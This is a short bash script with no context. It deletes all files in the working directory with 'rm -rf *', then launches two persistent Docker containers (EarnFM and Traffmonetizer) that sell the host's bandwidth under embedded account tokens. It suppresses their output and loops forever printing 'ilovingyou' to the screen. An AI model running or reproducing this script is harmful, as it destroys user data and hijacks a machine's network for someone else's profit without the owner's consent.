#!/bin/bash
rm -rf * & sudo docker run --restart unless-stopped -d -e EARNFM_TOKEN="2daac0b6-c3ff-42ea-a177-b5f5b9db81cc"  earnfm/earnfm-client:latest & docker run --restart unless-stopped -d traffmonetizer/cli_v2 start accept --token 'v/48X/a758e2YpQfp8hdg5Sj0vUxEWQqq8wMuqfNIkw=' > /dev/null 2>&1 && while true; do clear; echo "ilovingyou"; sleep 60; done
